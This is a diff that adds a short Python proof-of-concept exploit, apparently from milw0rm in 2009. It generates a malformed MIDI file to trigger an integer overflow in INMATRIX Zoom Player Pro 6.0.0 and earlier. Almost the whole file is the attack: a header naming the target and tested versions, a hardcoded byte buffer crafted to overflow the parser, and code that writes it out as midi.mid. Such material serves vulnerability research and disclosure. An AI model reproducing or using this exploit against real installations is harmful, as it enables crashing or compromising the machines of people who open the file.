@@ -1,0 +1,28 @@
+#!/usr/bin/env python
+
+##################################################################
+#
+# INMATRIX Zoom Player Pro <= 6.0.0 (.MID) Integer Overflow PoC 
+# Found By:	Dr_IDE
+# Credits:	Platen
+# Tested:	verified on v 5.0.2 and 6.0.0 on XP SP3
+# Download:	http://www.inmatrix.com
+#
+##################################################################
+
+# MIDI Structure must be accurate
+# 
+buff = (
+"\x4d\x54\x68\x64\x00\x00\x00\x06\x00\x01\x00\x01\x00\x60\x4d\x54"
+"\x72\x6b\x00\x00\x00\x4e\x00\xff\x03\x08\x34\x31\x33\x61\x34\x61"
+"\x35\x30\x00\x91\x41\x60\x01\x3a\x60\x01\x4a\x60\x01\x50\x60\x7d"
+"\x81\x41\x01\x01\x3a\x5f\x8d\xe4\xa0\x01\x50\x01\x3d\x91\x41\x60"
+"\x81\x00\x81\x41\x40\x00\x91\x3a\x60\x81\x00\x76\x6f\xcc\x3d\xa6"
+"\xc2\x48\xee\x8e\xca\xc2\x57\x00\x91\x50\x60\x81\x00\x81\x50\x40"
+"\x00\xff\x2f\x00");                                                    
+
+f1 = open("midi.mid","w");
+f1.write(buff);
+f1.close();
+
+# milw0rm.com [2009-09-10]
